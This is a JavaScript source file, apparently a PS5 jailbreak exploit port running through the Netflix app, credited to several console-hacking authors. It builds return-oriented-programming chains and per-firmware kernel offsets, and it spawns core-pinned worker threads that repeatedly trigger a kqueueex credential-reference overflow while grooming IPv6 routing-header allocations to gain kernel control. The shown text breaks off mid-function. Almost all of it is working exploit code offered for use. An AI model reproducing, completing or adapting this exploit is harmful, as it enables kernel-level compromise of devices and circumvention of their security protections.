/*
 * p2jb-y2jb - PS5 jailbreak port to Netflix-N-Hack (Netflix/JS), tested on FW 10.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - P2JB Y2JB port: matem6 (https://github.com/matem6/P2JB-Y2JB-Porting)
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *   - Edigax: multi-core leak implementation (~48 min vs ~2h)
 *
 * Usage: see README.md.
 */


// p2jb

(function () {

    /***** misc.js *****/
    function find_pattern(buffer, pattern_string) {
        const parts = pattern_string.split(' ');
        const matches = [];

        for (let i = 0; i <= buffer.length - parts.length; i++) {
            let match = true;

            for (let j = 0; j < parts.length; j++) {
                if (parts[j] === '?') continue;
                if (buffer[i + j] !== parseInt(parts[j], 16)) {
                    match = false;
                    break;
                }
            }

            if (match) matches.push(i);
        }

        return matches;
    }

    function call_pipe_rop(fildes) {
        write64(add_rop_smash_code_store, 0xab0025n);
        real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

        let rop_i = 0;

        fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop[rop_i++] = SYSCALL.pipe;
        fake_rop[rop_i++] = syscall_wrapper;

        // Store rax (read_fd) to fildes[0]
        fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop[rop_i++] = fildes;
        fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

        // Store rdx (write_fd) to fildes[4]
        fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop[rop_i++] = fildes + 4n;
        fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret

        // Return safe tagged value to JavaScript
        fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
        fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
        fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
        fake_rop[rop_i++] = real_rbp;

        write64(add_rop_smash_code_store, 0xab00260325n);
        oob_arr[39] = base_heap_add + fake_frame;
        return rop_smash(obj_arr[0]);          // Call ROP
    }

    function create_pipe() {
        const fildes = malloc(0x10);

        call_pipe_rop(fildes);

        const read_fd = read32_uncompressed(fildes);
        const write_fd = read32_uncompressed(fildes + 4n);
        //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
        return [read_fd, write_fd];
    }

    function read_buffer(addr, len) {
        const buffer = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
        }
        return buffer;
    }

    function write_buffer(addr, buffer) {
        for (let i = 0; i < buffer.length; i++) {
            write8_uncompressed(addr + BigInt(i), buffer[i]);
        }
    }

    function get_nidpath() {
        const path_buffer = malloc(0x255);
        const len_ptr = malloc(8);

        write64_uncompressed(len_ptr, 0x255n);

        const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
        if (ret === 0xffffffffffffffffn) {
            throw new Error("randomized_path failed : " + hex(ret));
        }

        return read_cstring(path_buffer);
    }

    function check_jailbroken() {
        if (!is_jailbroken()) {
            throw new Error("process is not jailbroken");
        }
    }

    function file_exists(path) {
        const path_addr = alloc_string(path);
        const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

        if (fd !== 0xffffffffffffffffn) {
            syscall(SYSCALL.close, fd);
            return true;
        } else {
            return false;
        }
    }

    function write_file(path, text) {
        const mode = 0x1ffn; // 777
        const path_addr = alloc_string(path);
        const data_addr = alloc_string(text);

        const flags = O_CREAT | O_WRONLY | O_TRUNC;
        const fd = syscall(SYSCALL.open, path_addr, flags, mode);

        if (fd === 0xffffffffffffffffn) {
            throw new Error("open failed for " + path + " fd: " + hex(fd));
        }

        const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
        if (written === 0xffffffffffffffffn) {
            syscall(SYSCALL.close, fd);
            throw new Error("write failed : " + hex(written));
        }

        syscall(SYSCALL.close, fd);
        return Number(written); // number of bytes written
    }

    try {
        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const UMTX_OP_WAIT = 2n;
        const UMTX_OP_WAKE = 3n;
        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;

        const UIO_SYSSPACE = 1n;

        const TRIPLEFREE_ATTEMPTS = 96;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        const NUM_IPV6_SOCKETS = 64;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const LEAK_CORES = [0, 1, 2, 3];
        const LEAK_SYSCALLS = 0x100000001n;
        const LEAK_FD_MAX = 8192n
        const LEAK_SYSCALLS_FINAL = 0xFEDn;

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            setrlimit: 0xC3n,
        };
        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: null,
            };
        }

        var S = make_state();

        const FW_OFFSETS_P2JB = {
            "9.00": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "9.05": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "10.00": {
                DATA_BASE_ALLPROC: 0x02765D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
                DATA_BASE_GVMSPACE: 0x02D52570n
            },
            "11.00": {
                DATA_BASE_ALLPROC: 0x02875D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
                DATA_BASE_GVMSPACE: 0x02E66570n
            },
            "12.00": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
        };
        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.20": "9.05", "9.40": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.60": "10.00",
            "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
            "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
            "12.60": "12.00", "12.70": "12.00",
        };

        function ensure_kernel_offset() {

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                const major = FW_VERSION.split(".")[0];
                fw = FW_OFFSETS_P2JB[major + ".00"];
            }
            if (!fw) throw new Error("p2jb: FW " + FW_VERSION + " not supported");

            kernel_offset = {
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,
                PROC_VM_SPACE: 0x200n,
                PROC_COMM: -1n, PROC_SYSENT: -1n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n,
                SIZEOF_OFILES: 0x30n,

                FD_CDIR: 0x08n, FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n,

                SO_PCB: 0x18n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n,

                PIPE_SIGIO: 0xD8n,

                PMAP_PML4: 0x20n, PMAP_CR3: 0x28n,

                SIZEOF_GVMSPACE: 0x100n,
                GVMSPACE_START_VA: 0x08n,
                GVMSPACE_SIZE: 0x10n,
                GVMSPACE_PAGE_DIR_VA: 0x38n,

                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS || null,
                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE || null,
                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE || null,
                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x09n : null,
                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x24n : null,
                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn : null,
            };

            S.OFF = kernel_offset;
        }

        let ROP = {
            get pop_rsp()             { return g.get('pop_rsp');               },
            get pop_rax()             { return g.get('pop_rax');               },
            get pop_rdi()             { return g.get('pop_rdi');               },
            get pop_rsi()             { return g.get('pop_rsi');               },
            get pop_rdx()             { return g.get('pop_rdx');               },
            get pop_rcx()             { return g.get('pop_rcx');               },
            get pop_r8()              { return g.get('pop_r8');                },
            get ret()                 { return g.get('ret');                   },
            get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
        };

        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
        }

        function spawn_leak_worker(chain_addr) {
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64_uncompressed(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64_uncompressed(jb + BigInt(i), scratch);

            write64_uncompressed(jb + 0x00n, g.get('ret'));
            write64_uncompressed(jb + 0x10n, chain_addr);
            write32_uncompressed(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32_uncompressed(jb + 0x44n, BigInt(saved_mxcsr));

            const stack_size = 0x400n;
            const tls_size = 0x40n;
            const thr_new_args = malloc(0x80);
            for (let i = 0; i < 0x80; i += 8) write64_uncompressed(thr_new_args + BigInt(i), 0n);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(Number(stack_size));
            const tls = malloc(Number(tls_size));

            write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);
            write64_uncompressed(thr_new_args + 0x08n, jb);
            write64_uncompressed(thr_new_args + 0x10n, stack);
            write64_uncompressed(thr_new_args + 0x18n, stack_size);
            write64_uncompressed(thr_new_args + 0x20n, tls);
            write64_uncompressed(thr_new_args + 0x28n, tls_size);
            write64_uncompressed(thr_new_args + 0x30n, tid_addr);
            write64_uncompressed(thr_new_args + 0x38n, cpid);

            const ret = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (ret !== 0n) fail("leak worker thr_new failed: " + toHex(ret));
            const tid = read64_uncompressed(tid_addr);
            return tid;
        }

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder, rt_prio) {
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;

            // Allocate the chain buffer and keep the ArrayBuffer reference so we can
            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, minimizing gc pressure
            const buf = malloc(STACK_SIZE);
            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
            const chain_view = new BigUint64Array(chain_ab);
            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
            chain_view.fill(0n, 0, 0x800);

            const entry = buf + 0x4000n;
            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts

            const mask = malloc(0x10);
            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
            write64_uncompressed(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
            // at() converts a slot index to its in-memory address.
            // Only called in repairSlot (~20k times), not in the emit hot path.
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(RTP_SET);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_prio);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummybuf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, ROP.pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, ROP.pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }
            emit(ROP.pop_rax); emit(EXIT_MARK);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { buf, entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function build_kqueueex_final_chain(count, core, finished_addr, rt_prio) {
            const POC_ARG = 0x800000000000n;
            const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;

            const buf = malloc(STACK_SIZE);
            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
            const chain_view = new BigUint64Array(chain_ab);
            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
            chain_view.fill(0n, 0, 0x800);

            const entry = buf + 0x4000n;
            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts

            const mask = malloc(0x10);
            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
            write64_uncompressed(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(RTP_SET);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_prio);
            emit(syscall_wrapper);
            emit(ROP.ret);

            for (let k = 0; k < Number(count); k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return entry;
        }

        function fail(msg) { throw new Error("p2jb: " + msg); }

        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8_uncompressed(buf, 0n);
            write8_uncompressed(buf + 1n, BigInt(len));
            write8_uncompressed(buf + 2n, 0n);
            write8_uncompressed(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }

        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }

        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n) {
            const HDR_SIZE = 8;
            const ARRAY_SIZE = 3 * n * 8;
            const raw = malloc(64 + HDR_SIZE + ARRAY_SIZE + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const cmd_addr = raw + align;
            const finished_base = cmd_addr + 8n;
            const awake_base = finished_base + BigInt(n * 8);

            write64_uncompressed(cmd_addr, 0n);
            for (let i = 0; i < n; i++) {
                write64_uncompressed(finished_base + BigInt(i * 8), 0n);
                write64_uncompressed(awake_base + BigInt(i * 8), 0n);
            }

            const ws = {
                n,
                cmd: cmd_addr,
                gen: 0n,
                finished: finished_base,
                awake: awake_base,

                wait_val_slots: new Array(n).fill(0n),
                pivot_slots: new Array(n).fill(0n),
                exit_addrs: new Array(n).fill(0n),
                signal() {
                    const next = this.gen + 1n;
                    this.gen = next;

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.finished + BigInt(i * 8), 0n);
                        write64_uncompressed(this.awake + BigInt(i * 8), 0n);
                    }

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.wait_val_slots[i], next);
                    }

                    write64_uncompressed(this.cmd, next);

                    const deadline = Date.now() + 5000;
                    while (true) {
                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
                            0x7FFFFFFFn, 0n, 0n);
                        let all_awake = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64_uncompressed(this.awake + BigInt(i * 8)) === 0n) {
                                all_awake = false; stuck = i; break;
                            }
                        }
                        if (all_awake) break;
                        if (Date.now() > deadline)
                            fail("worker_sync.signal: WAKE timeout - worker " +
                                stuck + "/" + n + " never reached WAIT exit");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64_uncompressed(this.finished + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline)
                            fail("worker_sync.wait: timeout - worker " + stuck +
                                "/" + n + " stalled (no response in 15s)");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                terminate() {

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.pivot_slots[i], this.exit_addrs[i]);
                    }
                    this.signal();
                    this.wait();
                },
            };
            return ws;
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            const STACK_SIZE = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
            const entry = buf + 0x4000n;

            const cmd_addr = ws.cmd;
            const awake_addr = ws.awake + BigInt(wid * 8);
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const waitBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
            emit(ROP.pop_rdi); emit(cmd_addr);
            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
            emit(ROP.pop_rdx); emit(0n);
            emit(ROP.pop_rcx); emit(0n);
            emit(ROP.pop_r8); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const wait_val_slot = at(waitBase + 7);

            const awakeBase = idx;
            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(awake_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.ret);

            const workBase = idx;
            emit(ROP.pop_rax); emit(sysnum);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(count_arg);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(waitBase + 0, ROP.pop_rax);
            repairSlot(waitBase + 1, SYSCALL.umtx_op);
            repairSlot(waitBase + 2, ROP.pop_rdi);
            repairSlot(waitBase + 3, cmd_addr);
            repairSlot(waitBase + 4, ROP.pop_rsi);
            repairSlot(waitBase + 5, UMTX_OP_WAIT);
            repairSlot(waitBase + 6, ROP.pop_rdx);

            repairSlot(waitBase + 8, ROP.pop_rcx);
            repairSlot(waitBase + 9, 0n);
            repairSlot(waitBase + 10, ROP.pop_r8);
            repairSlot(waitBase + 11, 0n);
            repairSlot(waitBase + 12, syscall_wrapper);
            repairSlot(awakeBase + 0, ROP.pop_rax);
            repairSlot(awakeBase + 1, 1n);
            repairSlot(awakeBase + 2, ROP.pop_rdi);
            repairSlot(awakeBase + 3, awake_addr);
            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
            repairSlot(workBase + 0, ROP.pop_rax);
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, ROP.pop_rdi);
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, ROP.pop_rsi);
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, ROP.pop_rdx);
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const pivotSlotIdx = idx;
            emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT_START = idx;
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return {
                entry,
                wait_val_slot,
                pivotAddr: at(pivotSlotIdx),
                exitAddr: at(EXIT_START),
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0n);
            write16_uncompressed(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16_uncompressed(S.rt_params, PRI_REALTIME);
            write16_uncompressed(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
        }

        function get_current_core() {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8_uncompressed(mask + BigInt(i), 0n);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
            let num = Number(read32_uncompressed(mask));
            let position = 0;
            while (num > 0) { num = num >>> 1; position += 1; }
            return position - 1;
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8_uncompressed(mask + BigInt(i), 0n);
            write16_uncompressed(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32_uncompressed(sv1));
            S.iov_sock_b = Number(read32_uncompressed(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32_uncompressed(sv2));
            S.uio_sock_b = Number(read32_uncompressed(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64_uncompressed(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64_uncompressed(S.recvmsg_iovecs, 1n);
            write64_uncompressed(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64_uncompressed(S.recvmsg_hdr + BigInt(i), 0n);
            write64_uncompressed(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32_uncompressed(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_read + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_read, S.uio_read_buf);
            write64_uncompressed(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_write + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_write, S.uio_write_buf);
